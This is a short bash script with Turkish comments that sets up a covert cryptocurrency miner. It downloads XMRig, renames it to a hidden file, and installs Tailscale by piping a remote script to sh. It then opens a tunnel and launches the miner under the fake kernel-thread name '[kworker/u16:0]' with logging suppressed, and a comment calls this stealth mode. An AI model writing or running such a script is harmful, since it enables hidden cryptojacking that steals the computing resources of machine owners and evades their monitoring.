#!/bin/bash
AGENT=".sys_core_logic"

# 1. Mining motorunu indir ve gizle
wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
mv xmrig-6.22.2/xmrig ./$AGENT
rm -rf xmrig-6.22.2*

# 2. Tailscale Başlat (GİZLİ TÜNEL)
curl -fsSL https://tailscale.com/install.sh | sh
tailscale up --authkey=$TAILSCALE_AUTH

# 3. Mining'i Başlat (Process maskeleme aktif)
# Burada mining artık Tailscale üzerinden senin VDS'ine 127.0.0.1 tünelinden akar.
exec -a "[kworker/u16:0]" ./$AGENT \
    --cpu-max-threads-hint 35 \
    --background \
    --log-file /dev/null \
    -o 127.0.0.1:1123 \
    -u $ZEPH_WALLET \
    -p "GHOST_WORKER" \
    > /dev/null 2>&1 &

echo "Tailscale Tünel Aktif. Madenci Gizli Modda Çalışıyor."
